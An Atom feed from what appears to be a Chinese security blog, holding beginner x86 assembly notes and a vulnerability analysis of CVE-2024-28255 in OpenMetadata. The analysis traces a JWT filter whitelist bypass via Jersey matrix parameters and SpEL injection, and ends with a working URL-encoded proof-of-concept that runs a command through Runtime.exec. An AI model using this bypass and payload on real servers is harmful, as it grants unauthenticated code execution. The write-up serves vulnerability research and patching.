<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Drunkbaby&#39;s Blog</title>
  
  <subtitle>Hexo theme keep quick starter</subtitle>
  <link href="https://drun1baby.github.io/atom.xml" rel="self"/>
  
  <link href="https://drun1baby.github.io/"/>
  <updated>2024-06-15T08:13:33.627Z</updated>
  <id>https://drun1baby.github.io/</id>
  
  <author>
    <name>Keep Team</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>瑞友天翼应用虚拟化系统 V7.0.5.1 多个漏洞分析</title>
    <link href="https://drun1baby.github.io/2024/06/07/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-V7-0-5-1-%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2024/06/07/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-V7-0-5-1-%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2024-06-07T07:26:08.000Z</published>
    <updated>2024-06-15T08:13:33.627Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="102165cc3673bdc04540f2c7f57100328a5254c2f022c920144e42dfc3b0abf4"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="PHP" scheme="https://drun1baby.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>汇编入门学习</title>
    <link href="https://drun1baby.github.io/2024/05/11/%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>https://drun1baby.github.io/2024/05/11/%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-05-11T13:10:54.000Z</published>
    <updated>2024-06-13T18:03:31.406Z</updated>
    
    <content type="html"><![CDATA[<p><a class="link" href="https://www.bilibili.com/video/BV1Rs411c7HG">https://www.bilibili.com/video/BV1Rs411c7HG<i class="fas fa-external-link-alt"></i></a></p><p>前期内容还是挺理论的，要先搞清楚电脑都有什么组成，都负责哪些功能，是怎么样运作的。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>汇编语言是直接在硬件之上工作的编程语言，首席按要了解硬件系统的结构，才能有效的应用汇编语言对其编程。</p><p>汇编的研究重点放在如何利用硬件系统的编程结构和指令集有效灵活的控制系统进行工作。</p><h3 id="机器语言"><a href="#机器语言" class="headerlink" title="机器语言"></a>机器语言</h3><p>机器语言是机器指令的集合。</p><p>机器指令展开来讲就是一台机器可以正确执行的命令。比如这个指令 <code>01010000</code> （PUSH AX）—— 把 AX 推进堆栈。</p><p>而机器码只认识 01，所以在很多时候非常不方便，这就产生了汇编语言</p><h2 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h2><p>汇编语言的主体是汇编指令，汇编语言和机器语言其实是一一对应的，也就是直接把 01 翻译成了对应能被识别的东西。如下的一个例子就是很好的说明。</p><img src="/2024/05/11/%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/sample1.png" class><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>简单的讲是 CPU 中可以存储数据的器件，一个 CPU 中有多个寄存器。</p><p>AX 是其中一个寄存器的代号，BX 则是另一个寄存器的代号。</p><ul><li>然而这里又涉及到一个概念，计算机能读懂的只有机器语言，怎么样让计算机读懂汇编语言呢？</li></ul><p>中间其实是通过一个编译器，它会将汇编指令翻译为机器码。</p><h3 id="汇编语言的组成"><a href="#汇编语言的组成" class="headerlink" title="汇编语言的组成"></a>汇编语言的组成</h3><p>汇编语言由以下三类组成</p><p>1、汇编指令（机器码的助记符）<br>2、伪指令（由编译器执行，编译器认识，计算机不认识）<br>3、其他符号（由编译器识别，比如加减乘除）</p><p>汇编语言的核心是汇编指令，它决定了汇编语言的特性。</p><h3 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h3><p>CPU 是计算机的核心部分，它控制了整个计算机的运作并进行运算，要想让一个 CPU 工作，就必须要向它提供指令和数据。</p><ul><li>指令和数据在存储器中存放，也就是平时所说的内存。</li><li>CPU 是基于内存运行的，离开了内存，性能再好的 CPU 也无法工作。</li></ul><p>磁盘不同于内存，磁盘上的数据或程序如果不被读到内存中，就无法被 CPU 使用。</p><h3 id="指令和数据"><a href="#指令和数据" class="headerlink" title="指令和数据"></a>指令和数据</h3><p>指令和数据是应用上的概念。在内存或磁盘上，指令和数据没有任何区别，都是二进制信息。</p><p>比如目前有个二进制 <code>1000100111011000</code></p><p>对应的数据为 ——&gt; 89D8H（数据）<br>同样可以表示为一个指令 ——&gt; MOV AX,BX（程序）</p><h3 id="存储单元"><a href="#存储单元" class="headerlink" title="存储单元"></a>存储单元</h3><p>存储器被划分为若干个存储单元，每个存储单元从 0 开始顺序编号。例如一个存储器有 128 个存储单元，编号从 0 ~ 127，如图所示</p><img src="/2024/05/11/%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/unite.png" class><p>对于大容量的存储器一般还用以下单位来计量容量，磁盘上的容量单位同内存的一样，实际上以上单位是微机中常用的计量单位。</p><p>1KB &#x3D; 1024B<br>1MB &#x3D; 1024KB<br>1GB &#x3D; 1024MB<br>1T &#x3D; 1024GB</p><h3 id="CPU-对存储器的读写"><a href="#CPU-对存储器的读写" class="headerlink" title="CPU 对存储器的读写"></a>CPU 对存储器的读写</h3><p>CPU 想要进行数据的读写，必须和外部器件（标准的说法是芯片）进行三类信息的交互</p><ul><li>存储单元的地址（地址信息，比如内存、硬盘、显卡等）</li><li>器件的选择，读或写命令（控制信息）</li><li>读或写的数据（数据信息）</li></ul><p>由于电子计算机能处理、传输的信息都是电信号，电信号是用导线传送的，这也是 CPU 传输地址、数据、控制信息的通道。</p><p>在计算机中有专门连接 CPU 和其他芯片的导线，通常称为总线。</p><p><strong>总线</strong>：是指计算机组件间规范化的交换数据（data）的方式，即以一种通用的方式为各组件提供数据传送和控制逻辑。</p><p>简单来说，总线是计算机硬件设备之间用来通信的</p><p>总线是单向的 例如：不能同时进行读取和写入的操作</p><p>物理上：一根根导线的集合；<br>逻辑上：地址总线、数据总线、控制总线</p><p>用下图来表示</p><img src="/2024/05/11/%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/cpu2Storage.png" class><ul><li>数据总线（Data Bus）：在 CPU 与 RAM 之间来回传送需要处理或是需要储存的数据。总线是宽度决定了 CPU 与其它器件进行数据传送时一次数据的传送量。这也就决定了传送速度。</li><li>地址总线（Address Bus）：用来指定在 RAM（Random Access Memory）之中储存的数据的地址。总线宽度决定了 CPU 的寻址能力。一个 CPU 有 N 根地址总线，则可以说这个 CPU 的地址总线的宽度为 N。这样的 CPU 最多可以寻找 2 的 N 次方个内存单元。</li><li>控制总线（Control Bus）：将微处理器控制单元（Control Unit）的信号，传送到周边设备，一般常见的为 USB Bus 和 1394 Bus。总线宽度决定了 CPU 对系统中其它器件的控制能力。</li></ul><h3 id="内存地址空间"><a href="#内存地址空间" class="headerlink" title="内存地址空间"></a>内存地址空间</h3><p>最终运行程序的是 CPU，我们用汇编的思维去理解程序，考虑问题。</p><p>首先思考如下一个场景，若我们电脑需要把一张图片显示出来，需要哪些过程或者说是步骤呢。</p><p>这里首先需要得到一个对应的内存地址，然后把数据放到对应的内存地址上面，最后再把数据的内容呈现到网卡上。而不同地址对应的其实是不同的器件，如内存条，显卡，网卡，RAM 主存储器等等。</p><p>而这些器件都分配了对应的地址，CPU 是根据地址传输对应需要的数据的。</p><p>接下来再看看一个例子，有如下程序，为什么得到的 q 的结果不是 6 + 7 + 8 &#x3D; 21，而是 22 呢</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> main &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i=<span class="number">5</span>,j=<span class="number">5</span>,q,p;</span><br><span class="line">p = (i++)+(i++)+(i++);</span><br><span class="line">q = (++j)+(++j)+(++j);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n,%d\n,%d\n,%d\n&quot;</span>, p,q,i,j)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实可以编译完之后，通过汇编语言来看问题。（留给自己的实践任务）</p><h2 id="寄存器（CPU-工作原理）"><a href="#寄存器（CPU-工作原理）" class="headerlink" title="寄存器（CPU 工作原理）"></a>寄存器（CPU 工作原理）</h2><h3 id="寄存器概述"><a href="#寄存器概述" class="headerlink" title="寄存器概述"></a>寄存器概述</h3><p>X86 有 14 个寄存器，它们的名称为：AX、BX、CX、DX、SI、DI、SP、BP、IP、CS、SS、DS、ES、PSW。</p><p>寄存器有许多分类(以下为 x86)</p><ul><li>通用寄存器</li><li>标志寄存器</li><li>指令寄存器</li><li>段寄存器</li><li>控制寄存器</li><li>调试寄存器</li><li>描述符寄存器</li><li>任务寄存器</li><li>MSR寄存器</li></ul><p>AX、BX、CX、DX 通常用来存放一般性数据，被称为通用寄存器。下面以 AX 为例，来看一下它的逻辑结构。如下图</p><img src="/2024/05/11/%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/logicOfAX.png" class><p>拿到一个数据，把它转换为二进制，再存储。</p><p>这四个通用寄存器都可以分为两个独立的 8 位寄存器使用，例如 AX 可以分为 AH 和 AL，H 就是 High，L 就是 Low。寄存器分高低，人不分贵贱（quoted by 小甲鱼</p><p>其实 AH 和 AL 分开和 AX 并不冲突，因为以前的系统是使用 8 位的，而不是 16 位，所以如果你要把 AX 向下兼容也是可以的，只要 8 - 15 都填 0 就可以，很好理解。</p><p>而如果在处理数据的时候，更常见的一种情况如下图所示。</p><img src="/2024/05/11/%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/axahal.png" class>]]></content>
    
    
    <summary type="html">汇编入门学习</summary>
    
    
    
    <category term="二进制" scheme="https://drun1baby.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
    
    <category term="二进制" scheme="https://drun1baby.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2024-28255 OpenMetaData 未授权命令执行漏洞分析</title>
    <link href="https://drun1baby.github.io/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2024-04-26T11:24:18.000Z</published>
    <updated>2024-04-30T12:25:36.157Z</updated>
    
    <content type="html"><![CDATA[<p>比较简单的一个洞，不过我自己也🕊了好久了</p><h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>OpenMetadata是一个统一的发现、可观察和治理平台，由中央元数据存储库、深入的沿袭和无缝团队协作提供支持。 OpenMetadata存在安全漏洞，该漏洞源于当请求的路径包含任何排除的端点时，过滤器将返回而不验证 JWT。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><p>OpenMetaData &lt; 1.2.4</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>debug 很简单，yml 里面加入这个即可</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">OPENMETADATA_DEBUG:</span> <span class="string">$&#123;OPENMETADATA_DEBUG:-true&#125;</span></span><br></pre></td></tr></table></figure><p>首先来看后台 RCE 的部分，其实有四个 Utils 类都有问题，这里只挑一个来讲</p><p>该漏洞出现在 EventSubscriptionResource.java 中，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GET</span>  </span><br><span class="line"><span class="meta">@Path(&quot;/validation/condition/&#123;expression&#125;&quot;)</span>  </span><br><span class="line"><span class="meta">@Operation(  </span></span><br><span class="line"><span class="meta">    operationId = &quot;validateCondition&quot;,  </span></span><br><span class="line"><span class="meta">    summary = &quot;Validate a given condition&quot;,  </span></span><br><span class="line"><span class="meta">    description = &quot;Validate a given condition expression used in filtering rules.&quot;,  </span></span><br><span class="line"><span class="meta">    responses = &#123;  </span></span><br><span class="line"><span class="meta">      @ApiResponse(responseCode = &quot;204&quot;, description = &quot;No value is returned&quot;),  </span></span><br><span class="line"><span class="meta">      @ApiResponse(responseCode = &quot;400&quot;, description = &quot;Invalid expression&quot;)  </span></span><br><span class="line"><span class="meta">    &#125;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">validateCondition</span><span class="params">(  </span></span><br><span class="line"><span class="params">    <span class="meta">@Context</span> UriInfo uriInfo,  </span></span><br><span class="line"><span class="params">    <span class="meta">@Context</span> SecurityContext securityContext,  </span></span><br><span class="line"><span class="params">    <span class="meta">@Parameter(description = &quot;Expression to validate&quot;, schema = @Schema(type = &quot;string&quot;))</span> <span class="meta">@PathParam(&quot;expression&quot;)</span>  </span></span><br><span class="line"><span class="params">        String expression)</span> &#123;  </span><br><span class="line">  AlertUtil.validateExpression(expression, Boolean.class);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进 validateExpression 方法，一眼 SpEL 表达式注入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">validateExpression</span><span class="params">(String condition, Class&lt;T&gt; clz)</span> &#123;  </span><br><span class="line">  <span class="keyword">if</span> (condition == <span class="literal">null</span>) &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parseExpression(condition);  </span><br><span class="line">  <span class="type">AlertsRuleEvaluator</span> <span class="variable">ruleEvaluator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AlertsRuleEvaluator</span>(<span class="literal">null</span>);  </span><br><span class="line">  <span class="keyword">try</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> expression.getValue(ruleEvaluator, clz);  </span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception exception) &#123;  </span><br><span class="line">    <span class="comment">// Remove unnecessary class details in the exception message  </span></span><br><span class="line">    <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> exception.getMessage().replaceAll(<span class="string">&quot;on type .*$&quot;</span>, <span class="string">&quot;&quot;</span>).replaceAll(<span class="string">&quot;on object .*$&quot;</span>, <span class="string">&quot;&quot;</span>);  </span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(CatalogExceptionMessage.failedToEvaluate(message));  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来看一下前面鉴权绕过的部分</p><p>在 OpenMetadata 使用 JwtFilter.java 对 JWT 进行验证，有部分 API 不需要做认证，在 JwtFilter.java 对这部分不需要做认证的 API 进行排除，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; EXCLUDED_ENDPOINTS =  </span><br><span class="line">     List.of(  </span><br><span class="line">         <span class="string">&quot;v1/system/config&quot;</span>,  </span><br><span class="line">         <span class="string">&quot;v1/users/signup&quot;</span>,  </span><br><span class="line">         <span class="string">&quot;v1/system/version&quot;</span>,  </span><br><span class="line">         <span class="string">&quot;v1/users/registrationConfirmation&quot;</span>,  </span><br><span class="line">         <span class="string">&quot;v1/users/resendRegistrationToken&quot;</span>,  </span><br><span class="line">         <span class="string">&quot;v1/users/generatePasswordResetLink&quot;</span>,  </span><br><span class="line">         <span class="string">&quot;v1/users/password/reset&quot;</span>,  </span><br><span class="line">         <span class="string">&quot;v1/users/checkEmailInUse&quot;</span>,  </span><br><span class="line">         <span class="string">&quot;v1/users/login&quot;</span>,  </span><br><span class="line">         <span class="string">&quot;v1/users/refresh&quot;</span>);</span><br></pre></td></tr></table></figure><p>在 API 进行鉴权时，OpenMetadata 的写法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">filter</span><span class="params">(ContainerRequestContext requestContext)</span> &#123;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="type">UriInfo</span> <span class="variable">uriInfo</span> <span class="operator">=</span> requestContext.getUriInfo();  </span><br><span class="line">        <span class="keyword">if</span> (!EXCLUDED_ENDPOINTS.stream().anyMatch((endpoint) -&gt; &#123;  </span><br><span class="line">            <span class="keyword">return</span> uriInfo.getPath().contains(endpoint);  </span><br><span class="line">        &#125;))</span><br></pre></td></tr></table></figure><p>这里要怎么进行漏洞利用呢？结合以往最常见的 bypass 手段应该是 <code>/v1/users/login/../../../xxx/xxx</code>，但是这里的中间件是 Jersey，用 <code>/</code> 是无效的。但是类似<code>;</code>矩阵参数会进行处理：</p><p>在 .class 文件当中，endpoint 没办法追踪变量，反编译看了一下，一下子就看明白了，getPath() 用来获取请求的整个路径。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">filter</span><span class="params">(ContainerRequestContext requestContext)</span> &#123;</span><br><span class="line">  <span class="type">UriInfo</span> <span class="variable">uriInfo</span> <span class="operator">=</span> requestContext.getUriInfo();</span><br><span class="line">  <span class="keyword">if</span> (EXCLUDED_ENDPOINTS.stream().anyMatch(endpoint -&gt; uriInfo.getPath().contains(endpoint))) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  &lt;JWT Token Validation&gt;</span><br></pre></td></tr></table></figure><img src="/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/path.png" class><p>uriInfo.getPath() 中包含 JwtFilter 中的白名单列表。看完了路径绕过，我个人对最终实现比较好奇，为什么我发起一个 <code>/api/v1;v1/users/login/events/subscriptions/validation/condition</code> 的请求，最终却能请求到 <code>/v1/events/subscriptions/subscriptions/validation/condition</code> 呢</p><p>类似于 Tomcat，在 glassfish&#x2F;jersey 中有一个 doDispatcher 来做请求的集中处理与分发的责任链机制，对应的路由处理是在 <code>org.glassfish.jersey.server.internal.routing.RoutingStage#apply</code> 方法</p><img src="/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/apply.png" class><p>对于子资源类型的请求，这里会逐级查找。首先找到前缀匹配的的顶级路由，然后根据顶级路由进行查找。跟进至 <code>org.glassfish.jersey.server.internal.routing.MatchResultInitializerRouter#apply</code> 方法，这里的处理非常玄妙。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rc.pushMatchResult(<span class="keyword">new</span> <span class="title class_">SingleMatchResult</span>(<span class="string">&quot;/&quot;</span> + processingContext.request().getPath(<span class="literal">false</span>)));</span><br></pre></td></tr></table></figure><p>先来看 getPath 的结果</p><img src="/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/getPath.png" class><p>接着跟进 <code>SingleMatchResult</code> 构造函数看是怎么处理的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SingleMatchResult</span><span class="params">(String path)</span> &#123;  </span><br><span class="line">    <span class="built_in">this</span>.path = stripMatrixParams(path);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进 stripMatrixParams() 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">stripMatrixParams</span><span class="params">(String path)</span> &#123;  </span><br><span class="line">    <span class="type">int</span> <span class="variable">e</span> <span class="operator">=</span> path.indexOf(<span class="number">59</span>);  </span><br><span class="line">    <span class="keyword">if</span> (e == -<span class="number">1</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> path;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">s</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">do</span> &#123;  </span><br><span class="line">            sb.append(path, s, e);  </span><br><span class="line">            s = path.indexOf(<span class="number">47</span>, e + <span class="number">1</span>);  </span><br><span class="line">            <span class="keyword">if</span> (s == -<span class="number">1</span>) &#123;  </span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            e = path.indexOf(<span class="number">59</span>, s);  </span><br><span class="line">        &#125; <span class="keyword">while</span>(e != -<span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (s != -<span class="number">1</span>) &#123;  </span><br><span class="line">            sb.append(path, s, path.length());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> sb.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先提取第一次出现 <code>;</code> 的地方，提取完毕之后，拿到 result1 字符串，再去定位 result1 字符串的第一个 <code>/</code>，如果不存在则直接 break。否则从第一个 <code>/</code> 出现的地方，开始找第一次出现 <code>;</code> 的地方。如果没有了，则跳出循环，如果有则继续处理。在我们精心构造过之后的 payload，得到的结果就顺理成章变成了 <code>/v1/events/subscriptions/validation/condition/xxx</code></p><img src="/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/final.png" class><p>从上面开始，拿到了核心路由非常关键。随后的语句把路由表和我们处理之后的核心路由进行比较，拿到一个新的路由表（前面其实就拿到一个路由表了）</p><img src="/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/continuationRouter.png" class><p>回到 <code>org.glassfish.jersey.server.internal.routing.RoutingStage#_appy</code> 方法，进入到迭代器了。迭代器里面会取出所有路由，根据匹配规则进行优先匹配，接着提取出 endpoint</p><img src="/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/endpoint.png" class><p>跟进 <code>Routers.extractEndpoint(router)</code> 来看具体的路由处理。router 就是被请求的资源接口，判断当前资源接口是否确认为接口，如果是的话，返回接口所有信息，最终得到的接口如图</p><img src="/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/EventResource.png" class><p>非常清晰，非常有趣。最终拿到的这个 endpoint 才是真正的路由资源。而在请求的过程中，由于 filter 还是仅仅处理资源请求，所以产生了这个漏洞，同理其实自己也可以构造类似的 payload，在本文中就不列举了。</p><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8585/api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/%54%28%6a%61%76%61.%6c%61%6e%67.%52%75%6e%74%69%6d%65%29.%67%65%74%52%75%6e%74%69%6d%65%28%29.%65%78%65%63%28%6e%65%77%20%6a%61%76%61.%6c%61%6e%67.%53%74%72%69%6e%67%28%54%28%6a%61%76%61.%75%74%69%6c.%42%61%73%65%36%34%29.%67%65%74%44%65%63%6f%64%65%72%28%29.%64%65%63%6f%64%65%28%22%64%47%39%31%59%32%67%67%4c%33%52%74%63%43%39%77%64%32%35%6c%5a%41%3d%3d%22%29%29%29</span><br></pre></td></tr></table></figure><img src="/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/rce.png" class><h2 id="0x05-Ref"><a href="#0x05-Ref" class="headerlink" title="0x05 Ref"></a>0x05 Ref</h2><p><a class="link" href="https://securitylab.github.com/advisories/GHSL-2023-235_GHSL-2023-237_Open_Metadata/">https://securitylab.github.com/advisories/GHSL-2023-235_GHSL-2023-237_Open_Metadata/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">CVE-2024-28255 漏洞分析</summary>
    
    
    
